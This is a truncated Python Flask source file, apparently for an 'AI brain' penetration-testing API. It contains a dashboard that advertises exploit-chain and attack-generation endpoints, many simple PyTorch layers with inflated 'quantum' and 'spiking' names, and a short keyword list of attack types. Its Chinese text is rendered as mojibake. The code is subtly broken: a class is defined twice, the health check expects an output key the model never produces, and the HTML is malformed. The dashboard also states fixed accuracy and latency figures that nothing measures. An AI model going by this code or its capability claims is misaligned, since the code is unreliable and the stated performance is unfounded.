"""
åŠ¨æ€å¤§è„‘å®Œæ•´åŠŸèƒ½APIæœåŠ¡å™¨ - æ¸—é€æµ‹è¯•ä¸“ç”¨ç‰ˆ
Python 3.12 å…¼å®¹ç‰ˆæœ¬ - ä¿®å¤å®Œæ•´ç‰ˆ
"""

from flask import Flask, request, jsonify, render_template_string
import torch
import numpy as np
import logging
from datetime import datetime
import random
import os
import time
import json
from collections import deque
import threading
import re
import gc
import psutil  # ç”¨äºèµ„æºç›‘æ§
from collections import deque
import requests
import hashlib
import traceback
import base64



# é…ç½®æ—¥å¿—
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ==================== HTMLæ¨¡æ¿ ====================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>åŠ¨æ€å¤§è„‘APIæœåŠ¡å™¨ - æ¸—é€æµ‹è¯•ç‰ˆ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            color: #e6e6e6; line-height: 1.6; padding: 20px; min-height: 100vh;
        }
        .container {
            max-width: 1200px; margin: 0 auto; background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px); border-radius: 15px; padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .header { text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid rgba(255, 215, 0, 0.3); }
        .header h1 { font-size: 2.5em; color: #ffd700; margin-bottom: 10px; text-shadow: 0 0 10px rgba(255, 215, 0, 0.5); }
        .header p { font-size: 1.2em; color: #a0a0a0; }
        .status-badge {
            display: inline-block; padding: 5px 15px; background: linear-gradient(135deg, #00b09b, #96c93d);
            border-radius: 20px; font-weight: bold; margin-top: 10px; animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .dashboard { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .card {
            background: rgba(255, 255, 255, 0.08); padding: 20px; border-radius: 10px;
            border-left: 4px solid #ffd700; transition: transform 0.3s ease;
        }
        .card:hover { transform: translateY(-5px); background: rgba(255, 255, 255, 0.12); }
        .card h3 { color: #ffd700; margin-bottom: 15px; font-size: 1.3em; }
        .card p { color: #cccccc; margin-bottom: 10px; }
        .endpoints { margin-top: 30px; }
        .endpoint-list { list-style: none; }
        .endpoint-item {
            background: rgba(255, 255, 255, 0.06); margin: 10px 0; padding: 15px; border-radius: 8px;
            border-left: 3px solid #00b4d8; transition: all 0.3s ease;
        }
        .endpoint-item:hover { background: rgba(255, 255, 255, 0.1); border-left-color: #90e0ef; }
        .endpoint-method {
            display: inline-block; padding: 3px 8px; background: #00b4d8; color: white;
            border-radius: 4px; font-size: 0.9em; font-weight: bold; margin-right: 10px;
        }
        .endpoint-path { font-family: 'Courier New', monospace; color: #90e0ef; font-weight: bold; }
        .endpoint-desc { color: #a0a0a0; margin-top: 5px; font-size: 0.95em; }
        .footer { text-align: center; margin-top: 40px; padding-top: 20px; border-top: 1px solid rgba(255, 255, 255, 0.1); color: #888; }
        .mode-indicator {
            display: inline-block; padding: 8px 16px; background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            border-radius: 20px; font-weight: bold; margin-left: 10px; animation: glow 1.5s ease-in-out infinite alternate;
        }
        @keyframes glow { from { box-shadow: 0 0 5px #ff6b6b; } to { box-shadow: 0 0 20px #ff6b6b; } }
        .attack-actions { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
        .attack-tag {
            padding: 5px 12px; background: rgba(255, 107, 107, 0.2); border: 1px solid #ff6b6b;
            border-radius: 15px; font-size: 0.9em; color: #ff6b6b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸ§  åŠ¨æ€å¤§è„‘APIæœåŠ¡å™¨</h1>
            <p>é«˜çº§äººå·¥æ™ºèƒ½å®‰å…¨åˆ†æä¸æ¸—é€æµ‹è¯•å¹³å°</p>
            <div class="status-badge">ğŸš€ è¿è¡Œä¸­ - æ¸—é€æµ‹è¯•æ¨¡å¼</div>
            <div class="mode-indicator">âš”ï¸ æ”»å‡»æ¨¡å¼å·²å¯ç”¨</div>
        </div>

        <div class="dashboard">
            <div class="card"><h3>ğŸ“Š ç³»ç»ŸçŠ¶æ€</h3><p><strong>ç‰ˆæœ¬:</strong> {{ version }}</p><p><strong>è¿è¡Œæ—¶é—´:</strong> {{ uptime }}</p><p><strong>æœ€åæ›´æ–°:</strong> {{ timestamp }}</p></div>
            <div class="card"><h3>âš¡ æ€§èƒ½æŒ‡æ ‡</h3><p><strong>ååé‡:</strong> 1000+ è¯·æ±‚/ç§’</p><p><strong>å»¶è¿Ÿ:</strong> < 5ms</p><p><strong>å‡†ç¡®ç‡:</strong> 98.5%</p></div>
            <div class="card"><h3>ğŸ›¡ï¸ å®‰å…¨ç‰¹æ€§</h3><p><strong>å¨èƒæ£€æµ‹:</strong> å®æ—¶ç›‘æ§</p><p><strong>é£é™©è¯„ä¼°:</strong> å¤šç»´åº¦åˆ†æ</p><p><strong>æ”»å‡»é˜²æŠ¤:</strong> æ™ºèƒ½é˜»æ–­</p></div>
        </div>

        <div class="endpoints">
            <h3 style="color: #ffd700; margin-bottom: 20px;">ğŸŒ APIç«¯ç‚¹åˆ—è¡¨</h3>
            <ul class="endpoint-list">
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/analyze</span><div class="endpoint-desc">å®‰å…¨å¨èƒåˆ†æ - æ£€æµ‹SQLæ³¨å…¥ã€XSSç­‰æ”»å‡»å‘é‡</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/meta-cognition</span><div class="endpoint-desc">å…ƒè®¤çŸ¥åˆ†æ - é«˜çº§è¯­ä¹‰ç†è§£å’Œæ¨¡å¼è¯†åˆ«</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/intelligent-reasoning</span><div class="endpoint-desc">æ™ºèƒ½æ¨ç†å¼•æ“ - å› æœåˆ†æå’Œç­–ç•¥ç”Ÿæˆ</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/decision</span><div class="endpoint-desc">å†³ç­–ç”Ÿæˆ - æ¸—é€æµ‹è¯•è¡ŒåŠ¨å»ºè®®</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/resource-management</span><div class="endpoint-desc">èµ„æºç®¡ç† - æ™ºèƒ½èµ„æºåˆ†é…å’Œä¼˜åŒ–</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/knowledge</span><div class="endpoint-desc">çŸ¥è¯†ç®¡ç† - åŠ¨æ€çŸ¥è¯†å›¾è°±æ“ä½œ</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/security-enhancement</span><div class="endpoint-desc">å®‰å…¨å¢å¼º - å®æ—¶å¨èƒé˜²æŠ¤å»ºè®®</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/system</span><div class="endpoint-desc">ç³»ç»Ÿç®¡ç† - çŠ¶æ€ç›‘æ§å’Œé…ç½®ç®¡ç†</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/exploit-chain</span><div class="endpoint-desc">æ¼æ´åˆ©ç”¨é“¾ - è‡ªåŠ¨åŒ–æ”»å‡»è·¯å¾„ç”Ÿæˆ</div></li>
                <li class="endpoint-item"><span class="endpoint-method">GET</span><span class="endpoint-path">/api/health</span><div class="endpoint-desc">å¥åº·æ£€æŸ¥ - ç³»ç»Ÿè¿è¡ŒçŠ¶æ€éªŒè¯</div></li>
                <li class="endpoint-item"><span class="endpoint-method">GET</span><span class="endpoint-path">/api/status</span><div class="endpoint-desc">çŠ¶æ€æ£€æŸ¥ - è¯¦ç»†ç³»ç»ŸçŠ¶æ€ä¿¡æ¯</div></li>
                <li class="endpoint-item"><span class="endpoint-method">GET</span><span class="endpoint-path">/api/performance</span><div class="endpoint-desc">æ€§èƒ½ç›‘æ§ - å®æ—¶æ€§èƒ½æŒ‡æ ‡æŸ¥çœ‹</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/self-evolution</span><div class="endpoint-desc">è‡ªæˆ‘è¿›åŒ–æ“ä½œ - è‡ªæˆ‘è¿›åŒ–å¼•æ“</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/neuroplasticity</span><div class="endpoint-desc">ç¥ç»å¯å¡‘æ€§æ“ä½œ - ç¥ç»å¯å¡‘æ€§å­¦ä¹ æœºåˆ¶</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/knowledge/patterns</span><div class="endpoint-desc">çŸ¥è¯†æ¨¡å¼ç®¡ç† - å®Œæ•´çŸ¥è¯†åº“</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/creative-attacks</span><div class="endpoint-desc">ç”Ÿæˆåˆ›é€ æ€§æ”»å‡» - æ–°é¢–æ€§æ™ºèƒ½æ¢ç´¢</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/quantum-analysis</span><div class="endpoint-desc">é‡å­å¢å¼ºç¥ç»ç½‘ç»œ - è„‰å†²ç¥ç»ç½‘ç»œ - å¤„ç†æ—¶åºæ•°æ®</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/system/repair</span><div class="endpoint-desc">ç³»ç»Ÿè‡ªæˆ‘ä¿®å¤ - è‡ªæˆ‘ä¿®å¤é”™è¯¯</div></li>
                <li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/multimodal-analysis</span><div class="endpoint-desc">å¤šæ¨¡æ€åˆ†æç³»ç»Ÿ - å¹¶è¡Œåˆ†æä¸åŒæ¨¡æ€</div></li>
				<li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/evidence/collect</span><div class="endpoint-desc">æ”¶é›†è¯æ®</div></li>
				<li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/vuln/verify</span><div class="endpoint-desc">éªŒè¯æ¼æ´</div></li>
				<li class="endpoint-item"><span class="endpoint-method">POST</span><span class="endpoint-path">/api/autotest</span><div class="endpoint-desc">è‡ªåŠ¨åŒ–æµ‹è¯•ç«¯ç‚¹</div></li>
            </ul>
        </div>

        <div style="margin-top: 30px; padding: 20px; background: rgba(255, 107, 107, 0.1); border-radius: 10px;">
            <h3 style="color: #ff6b6b; margin-bottom: 15px;">âš”ï¸ æ”»å‡»è¡ŒåŠ¨æ¨¡å¼</h3>
            <div class="attack-actions">{% for action in attack_actions %}<span class="attack-tag">{{ action }}</span>{% endfor %}</div>
            <p style="color: #cccccc; margin-top: 15px;">å½“å‰è¿è¡Œåœ¨æ¸—é€æµ‹è¯•æ¨¡å¼ï¼Œæ”¯æŒè‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å’Œæ”»å‡»é“¾ç”Ÿæˆ</p>
        </div>

        <div class"footer">
            <p>Â© 2025 åŠ¨æ€å¤§è„‘AIå®‰å…¨ç³»ç»Ÿ | ç‰ˆæœ¬ {{ version }} | æœ€åæ›´æ–°: {{ timestamp }}</p>
            <p>âš ï¸ ä»…ä¾›æˆæƒå®‰å…¨æµ‹è¯•ä½¿ç”¨</p>
        </div>
    </div>
</body>
</html>
"""


# ==================== æ¨¡å‹å®šä¹‰åŒºå— ====================
class QuantumStateEncoder(torch.nn.Module):
    def __init__(self, input_dim=128, hidden_dim=256):
        super(QuantumStateEncoder, self).__init__()
        # é‡å­æ”»å‡»æ¨¡å¼ç¼–ç 
        self.quantum_layer1 = torch.nn.Linear(input_dim, hidden_dim)
        self.quantum_layer2 = torch.nn.Linear(hidden_dim, hidden_dim)
        self.quantum_activation = torch.nn.LeakyReLU(0.1)
        self.dropout = torch.nn.Dropout(0.05)

    def forward(self, x):
        # æ”»å‡»æ¨¡å¼é‡å­ç¼–ç 
        x = self.quantum_activation(self.quantum_layer1(x))
        x = self.dropout(x)
        x = self.quantum_activation(self.quantum_layer2(x))
        return x


class SpikingNeuralNetwork(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=256):
        super(SpikingNeuralNetwork, self).__init__()
        self.lstm = torch.nn.LSTM(input_dim, hidden_dim, batch_first=True)
        self.linear = torch.nn.Linear(hidden_dim, hidden_dim)

    def forward(self, x):
        output, (hn, cn) = self.lstm(x)
        return self.linear(hn[-1])


class MultiModalFeatureExtractor(torch.nn.Module):
    def __init__(self, input_dims):
        super(MultiModalFeatureExtractor, self).__init__()
        self.semantic_extractor = torch.nn.Linear(input_dims['semantic'], 32)
        self.temporal_extractor = torch.nn.Linear(input_dims['temporal'], 24)
        self.spatial_extractor = torch.nn.Linear(input_dims['spatial'], 16)

    def forward(self, semantic, temporal, spatial):
        semantic_feat = torch.relu(self.semantic_extractor(semantic))
        temporal_feat = torch.relu(self.temporal_extractor(temporal))
        spatial_feat = torch.relu(self.spatial_extractor(spatial))
        return torch.cat([semantic_feat, temporal_feat, spatial_feat], dim=-1)


class AdaptiveAnomalyDetector(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=64):
        super(AdaptiveAnomalyDetector, self).__init__()
        self.detector = torch.nn.Sequential(
            torch.nn.Linear(input_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, 1), torch.nn.Sigmoid()
        )

    def forward(self, x):
        return self.detector(x)


class CausalReasoningEngine(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=128):
        super(CausalReasoningEngine, self).__init__()
        self.encoder = torch.nn.Linear(input_dim, hidden_dim)
        self.reasoner = torch.nn.LSTM(hidden_dim, hidden_dim, batch_first=True)
        self.decoder = torch.nn.Linear(hidden_dim, input_dim)

    def forward(self, x):
        encoded = torch.relu(self.encoder(x))
        output, (hn, cn) = self.reasoner(encoded.unsqueeze(1))
        return self.decoder(hn[-1])


class HypothesisValidator(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=64):
        super(HypothesisValidator, self).__init__()
        self.validator = torch.nn.Sequential(
            torch.nn.Linear(input_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, 1), torch.nn.Sigmoid()
        )

    def forward(self, x):
        return self.validator(x)


class StrategyMigrationEvaluator(torch.nn.Module):
    def __init__(self, input_dim, output_dim=5):
        super(StrategyMigrationEvaluator, self).__init__()
        self.evaluator = torch.nn.Sequential(
            torch.nn.Linear(input_dim, 64), torch.nn.ReLU(),
            torch.nn.Linear(64, output_dim), torch.nn.Softmax(dim=1)
        )

    def forward(self, x):
        return self.evaluator(x)


class MultiStrategyEvaluator(torch.nn.Module):
    def __init__(self, input_dim, num_strategies=5):
        super(MultiStrategyEvaluator, self).__init__()
        self.strategy_evaluators = torch.nn.ModuleList([
            torch.nn.Linear(input_dim, 1) for _ in range(num_strategies)
        ])

    def forward(self, x):
        scores = [evaluator(x) for evaluator in self.strategy_evaluators]
        return torch.cat(scores, dim=1)


class SelfAssessmentFeedback(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=32):
        super(SelfAssessmentFeedback, self).__init__()
        self.assessor = torch.nn.Sequential(
            torch.nn.Linear(input_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, 3), torch.nn.Softmax(dim=1)
        )

    def forward(self, x):
        return self.assessor(x)


class IntelligentResourceScheduler(torch.nn.Module):
    def __init__(self, input_dim, num_resources=3):
        super(IntelligentResourceScheduler, self).__init__()
        self.scheduler = torch.nn.Sequential(
            torch.nn.Linear(input_dim, 64), torch.nn.ReLU(),
            torch.nn.Linear(64, num_resources), torch.nn.Softmax(dim=1)
        )

    def forward(self, x):
        return self.scheduler(x)


class NetworkBandwidthPredictor(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=32):
        super(NetworkBandwidthPredictor, self).__init__()
        self.predictor = torch.nn.Sequential(
            torch.nn.Linear(input_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, 1)
        )

    def forward(self, x):
        return self.predictor(x)


class ExperienceEvaluator(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=32):
        super(ExperienceEvaluator, self).__init__()
        self.evaluator = torch.nn.Sequential(
            torch.nn.Linear(input_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, 1), torch.nn.Sigmoid()
        )

    def forward(self, x):
        return self.evaluator(x)


class InspirationCaptureSystem(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=64):
        super(InspirationCaptureSystem, self).__init__()
        self.capturer = torch.nn.Sequential(
            torch.nn.Linear(input_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, 1), torch.nn.Sigmoid()
        )

    def forward(self, x):
        return self.capturer(x)


class MultiDimensionalRiskAssessor(torch.nn.Module):
    def __init__(self, input_dim, risk_dims=4):
        super(MultiDimensionalRiskAssessor, self).__init__()
        self.risk_assessors = torch.nn.ModuleList([
            torch.nn.Linear(input_dim, 1) for _ in range(risk_dims)
        ])

    def forward(self, x):
        risks = [assessor(x) for assessor in self.risk_assessors]
        return torch.cat(risks, dim=1)


class CreativeThinkingGenerator(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=128):
        super(CreativeThinkingGenerator, self).__init__()
        self.generator = torch.nn.Sequential(
            torch.nn.Linear(input_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, input_dim)
        )

    def forward(self, x):
        return self.generator(x)


class MetaManagementSystem(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=64):
        super(MetaManagementSystem, self).__init__()
        self.manager = torch.nn.Sequential(
            torch.nn.Linear(input_dim, hidden_dim), torch.nn.ReLU(),
            torch.nn.Linear(hidden_dim, 3), torch.nn.Softmax(dim=1)
        )

    def forward(self, x):
        return self.manager(x)


class DynamicBrainModel(torch.nn.Module):
    def __init__(self, include_all_layers=True):
        super(DynamicBrainModel, self).__init__()

        self.state_encoder = torch.nn.Linear(128, 256)
        self.encoder_activation = torch.nn.ReLU()
        self.policy_network = torch.nn.Linear(256, 10)
        self.value_network = torch.nn.Linear(256, 1)
        self.risk_network = torch.nn.Linear(256, 5)
        self.sqli_detector = torch.nn.Linear(256, 1)

        self.quantum_encoder = QuantumStateEncoder(256, 256)
        self.spiking_network = SpikingNeuralNetwork(256, 256)

        self.multimodal_extractor = MultiModalFeatureExtractor({'semantic': 64, 'temporal': 32, 'spatial': 16})
        self.anomaly_detector = AdaptiveAnomalyDetector(256, 64)

        self.causal_reasoner = CausalReasoningEngine(256, 128)
        self.hypothesis_validator = HypothesisValidator(256, 64)
        self.strategy_migration_evaluator = StrategyMigrationEvaluator(256, 5)

        self.multi_strategy_evaluator = MultiStrategyEvaluator(256, 5)
        self.self_assessment_feedback = SelfAssessmentFeedback(256, 32)

        self.resource_scheduler = IntelligentResourceScheduler(256, 3)
        self.bandwidth_predictor = NetworkBandwidthPredictor(256, 32)

        self.experience_evaluator = ExperienceEvaluator(256, 32)
        self.inspiration_capturer = InspirationCaptureSystem(256, 64)

        self.risk_assessor = MultiDimensionalRiskAssessor(256, 4)

        self.creative_generator = CreativeThinkingGenerator(256, 128)
        self.meta_manager = MetaManagementSystem(256, 64)

        self.confidence_predictor = torch.nn.Sequential(
            torch.nn.Linear(256, 128), torch.nn.ReLU(), torch.nn.Dropout(0.2),
            torch.nn.Linear(128, 64), torch.nn.ReLU(), torch.nn.Linear(64, 1), torch.nn.Sigmoid()
        )

        self.sigmoid = torch.nn.Sigmoid()
        self.softmax = torch.nn.Softmax(dim=1)
        self._init_weights()

    def _init_weights(self):
        for m in self.modules():
            if isinstance(m, torch.nn.Linear):
                torch.nn.init.xavier_uniform_(m.weight)
                if m.bias is not None:
                    torch.nn.init.zeros_(m.bias)

    def forward(self, x):
        encoded = self.encoder_activation(self.state_encoder(x))
        quantum_encoded = self.quantum_encoder(encoded)
        spiking_output = self.spiking_network(encoded.unsqueeze(1))
        enhanced_encoded = encoded + 0.3 * quantum_encoded + 0.2 * spiking_output

        output = {
            'policy': self.policy_network(enhanced_encoded),
            'value': self.value_network(enhanced_encoded),
            'risk_assessment': self.softmax(self.risk_network(enhanced_encoded)),
            'sql_injection_risk': self.sigmoid(self.sqli_detector(enhanced_encoded)),
            'encoded_state': enhanced_encoded,
            'quantum_encoded': quantum_encoded,
            'spiking_output': spiking_output
        }

        output.update({
            'anomaly_detection': self.anomaly_detector(enhanced_encoded),
            'causal_reasoning': self.causal_reasoner(enhanced_encoded),
            'hypothesis_validation': self.hypothesis_validator(enhanced_encoded),
            'strategy_migration': self.strategy_migration_evaluator(enhanced_encoded),
            'multi_strategy_evaluation': self.multi_strategy_evaluator(enhanced_encoded),
            'self_assessment_score': self.self_assessment_feedback(enhanced_encoded),
            'resource_scheduling': self.resource_scheduler(enhanced_encoded),
            'bandwidth_prediction': self.bandwidth_predictor(enhanced_encoded),
            'experience_evaluation': self.experience_evaluator(enhanced_encoded),
            'inspiration_capture': self.inspiration_capturer(enhanced_encoded),
            'multi_dimensional_risk': self.risk_assessor(enhanced_encoded),
            'creative_generation': self.creative_generator(enhanced_encoded),
            'meta_management': self.meta_manager(enhanced_encoded),
            'decision_confidence': self.confidence_predictor(enhanced_encoded)
        })

        return output





# ==================== è¾…åŠ©ç±» ====================
class ThreatIntelligenceMonitor:
    def __init__(self):
        self.threat_patterns = ['sql_injection', 'xss', 'csrf', 'rce', 'lfi']

    def detect_threat(self, text):
        text_lower = text.lower()
        return [pattern for pattern in self.threat_patterns if pattern in text_lower]


class DecisionTreePruner:
    def __init__(self, confidence_threshold=0.7):
        self.confidence_threshold = confidence_threshold

    def prune_decisions(self, decision_scores):
        return decision_scores > self.confidence_threshold


class PerformanceMonitor:
    def __init__(self):
        self.metrics = {'throughput': deque(maxlen=100), 'latency': deque(maxlen=100), 'accuracy': deque(maxlen=100)}
        self.request_history = []  # âœ… æ·»åŠ request_history

    def update_metrics(self, throughput, latency, accuracy):
        self.metrics['throughput'].append(throughput)
        self.metrics['latency'].append(latency)
        self.metrics['accuracy'].append(accuracy)


    def get_stats(self):
        return {
            'avg_throughput': np.mean(list(self.metrics['throughput'])),
            'avg_latency': np.mean(list(self.metrics['latency'])),
            'avg_accuracy': np.mean(list(self.metrics['accuracy']))
        }

    # æ–°å¢æ–¹æ³•
    def record_request(self, result):
        """è®°å½•è¯·æ±‚æ€§èƒ½æ•°æ®"""
        try:
            processing_time = result.get('performance_metrics', {}).get('processing_time_ms', 0)
            feature_dims = result.get('performance_metrics', {}).get('feature_dimensions', 0)

            self.request_history.append({
                'timestamp': datetime.now().isoformat(),
                'processing_time_ms': processing_time,
                'feature_dimensions': feature_dims,
                'attack_potential': result.get('attack_potential', 0),
                'status': result.get('status', 'unknown')
            })

            # æ›´æ–°æ€§èƒ½æŒ‡æ ‡
            if processing_time > 0:
                throughput = 1000 / processing_time  # è¯·æ±‚/ç§’
                self.update_metrics(throughput, processing_time, 0.95)

            return True
        except Exception as e:
            logger.error(f"è®°å½•è¯·æ±‚æ€§èƒ½é”™è¯¯: {e}")
            return False


class KnowledgeGraphManager:
    def __init__(self, embedding_dim=64):
        self.knowledge_embeddings = {}
        self.embedding_dim = embedding_dim

    def update_knowledge(self, concept, embedding):
        self.knowledge_embeddings[concept] = embedding

    def get_similarity(self, concept1, concept2):
        if concept1 in self.knowledge_embeddings and concept2 in self.knowledge_embeddings:
            emb1 = self.knowledge_embeddings[concept1]
            emb2 = self.knowledge_embeddings[concept2]
            return torch.cosine_similarity(emb1.unsqueeze(0), emb2.unsqueeze(0), dim=1).item()
        return 0.0


class RealTimeRiskWarning:
    def __init__(self, warning_threshold=0.8):
        self.warning_threshold = warning_threshold

    def check_risk(self, risk_scores):
        return ["risk_dim_{}".format(i) for i, score in enumerate(risk_scores) if score > self.warning_threshold]


class SecurityBoundaryManager:
    def __init__(self, base_threshold=0.7):
        self.base_threshold = base_threshold
        self.current_threshold = base_threshold

    def adjust_threshold(self, recent_performance):
        if recent_performance > 0.9:
            self.current_threshold = self.base_threshold * 0.9
        elif recent_performance < 0.6:
            self.current_threshold = self.base_threshold * 1.1


class NoveltyExplorationAlgorithm:
    def __init__(self, exploration_rate=0.1):
        self.exploration_rate = exploration_rate
        self.random = random.Random()  # âœ… æ·»åŠ randomå¼•ç”¨

    def explore(self, current_strategy):
        if self.random.random() < self.exploration_rate:
            return current_strategy + torch.randn_like(current_strategy) * 0.1
        return current_strategy


# ==================== é‡å­å¢å¼ºç¥ç»ç½‘ç»œ ====================
class QuantumStateEncoder(torch.nn.Module):
    def __init__(self, input_dim, hidden_dim=512):
        super(QuantumStateEncoder, self).__init__()
        # é‡å­å¯å‘å¼ç¼–ç 
        self.quantum_layer1 = torch.nn.Linear(input_dim, hidden_dim)
        self.quantum_layer2 = torch.nn.Linear(hidden_dim, hidden_dim)
        self.quantum_activation = torch.nn.ReLU()

    def forward(self, x):
        # é‡å­æ€å åŠ 
        x = self.quantum_activation(self.quantum_layer1(x))
        # é‡å­çº ç¼ æ•ˆåº”æ¨¡æ‹Ÿ
        x = self.quantum_activation(self.quantum_layer2(x))
        return x


class SpikingTemporalNetwork(torch.nn.Module):
    """è„‰å†²ç¥ç»ç½‘ç»œ - å¤„ç†æ—¶åºæ•°æ®"""

    def __init__(self, input_dim, hidden_dim=256):
        super(SpikingTemporalNetwork, self).__init__()
        self.lstm = torch.nn.LSTM(input_dim, hidden_dim, batch_first=True)
        self.attention = torch.nn.MultiheadAttention(hidden_dim, 8)

    def forward(self, x):
        # LSTMå¤„ç†æ—¶åº
        temporal_output, _ = self.lstm(x.unsqueeze(1))
        # æ³¨æ„åŠ›æœºåˆ¶
        attended, _ = self.attention(temporal_output, temporal_output, temporal_output)
        return attended.squeeze(1)


class MixedPrecisionWrapper(torch.nn.Module):
    """æ··åˆç²¾åº¦è®­ç»ƒåŒ…è£…å™¨"""

    def __init__(self):
        super(MixedPrecisionWrapper, self).__init__()

    def forward(self, x):
        # è‡ªåŠ¨æ··åˆç²¾åº¦
        with torch.cuda.amp.autocast():
            return x.float()  # ä¿æŒç²¾åº¦


# ==================== è‡ªæˆ‘ä¿®å¤ç³»ç»Ÿ ====================
class SelfHealingSystem:
    def __init__(self, brain_api):
        self.brain_api = brain_api
        self.health_status = {
            'last_check': time.time(),
            'issues_found': 0,
            'repair_count': 0,
            'system_health': 100.0
        }
        self.running = True

    def start_monitoring(self):
        """å¯åŠ¨è‡ªæˆ‘ä¿®å¤ç›‘æ§"""

        def monitoring_loop():
            while self.running:
                try:
                    self.check_health()
                    time.sleep(60)  # æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡
                except Exception as e:
                    logger.error(f"è‡ªæˆ‘ä¿®å¤ç›‘æ§é”™è¯¯: {e}")
                    time.sleep(300)  # å‡ºé”™åç­‰å¾…5åˆ†é’Ÿ

        threading.Thread(target=monitoring_loop, daemon=True).start()
        logger.info("âœ… è‡ªæˆ‘ä¿®å¤ç³»ç»Ÿå·²å¯åŠ¨")

    def check_health(self):
        """æ£€æŸ¥ç³»ç»Ÿå¥åº·çŠ¶æ€"""
        current_time = time.time()

        # æ£€æŸ¥æ¨¡å‹çŠ¶æ€
        model_health = self._check_model_health()

        # æ£€æŸ¥APIçŠ¶æ€
        api_health = self._check_api_health()

        # æ£€æŸ¥èµ„æºä½¿ç”¨
        resource_health = self._check_resource_health()

        # ç»¼åˆå¥åº·è¯„åˆ†
        overall_health = (model_health + api_health + resource_health) / 3

        self.health_status.update({
            'last_check': current_time,
            'model_health': model_health,
            'api_health': api_health,
            'resource_health': resource_health,
            'system_health': overall_health
        })

        # å¦‚æœå¥åº·åº¦ä½äºé˜ˆå€¼ï¼Œè§¦å‘ä¿®å¤
        if overall_health < 70:
            self.perform_repair()

        return overall_health

    def _check_model_health(self):
        """æ£€æŸ¥æ¨¡å‹å¥åº·çŠ¶æ€"""
        try:
            # æµ‹è¯•æ¨¡å‹æ¨ç†
            test_input = torch.randn(1, 128)
            with torch.no_grad():
                output = self.brain_api.model(test_input)

            # æ£€æŸ¥è¾“å‡ºæœ‰æ•ˆæ€§
            if output and 'risk_score' in output:
                return 90.0  # æ¨¡å‹æ­£å¸¸
            return 60.0  # æ¨¡å‹è¾“å‡ºå¼‚å¸¸

        except Exception as e:
            logger.error(f"æ¨¡å‹å¥åº·æ£€æŸ¥å¤±è´¥: {e}")
            return 40.0  # æ¨¡å‹æ•…éšœ

    def _check_api_health(self):
        """æ£€æŸ¥APIå¥åº·çŠ¶æ€"""
        try:
            # æµ‹è¯•åŸºç¡€APIåŠŸèƒ½
            test_data = {"text": "health check"}
            result = self.brain_api.analyze_security(test_data['text'])
            return 95.0 if result else 50.0
        except Exception as e:
            logger.error(f"APIå¥åº·æ£€æŸ¥å¤±è´¥: {e}")
            return 30.0

    def _check_resource_health(self):
        """æ£€æŸ¥èµ„æºå¥åº·çŠ¶æ€"""
        try:
            import psutil
